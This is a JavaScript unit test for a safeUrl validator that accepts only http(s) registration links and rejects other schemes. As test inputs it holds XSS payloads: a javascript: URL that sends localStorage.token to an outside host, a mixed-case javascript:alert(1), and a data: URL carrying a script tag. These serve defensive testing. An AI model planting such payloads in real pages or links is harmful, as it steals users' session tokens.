import { test } from 'node:test';
import assert from 'node:assert/strict';
import { safeUrl } from './format.js';

test('link de inscrição: só http(s) passa (bloqueia javascript:)', () => {
  assert.equal(safeUrl('https://www.appbrasil.org.br/concursotcc2026/'), 'https://www.appbrasil.org.br/concursotcc2026/');
  assert.equal(safeUrl('http://exemplo.com'), 'http://exemplo.com/');
  assert.equal(safeUrl("javascript:fetch('https://x.com/?t='+localStorage.token)"), null);
  assert.equal(safeUrl('JaVaScRiPt:alert(1)'), null);
  assert.equal(safeUrl('data:text/html,<script>alert(1)</script>'), null);
  assert.equal(safeUrl('  '), null);
  assert.equal(safeUrl(null), null);
});
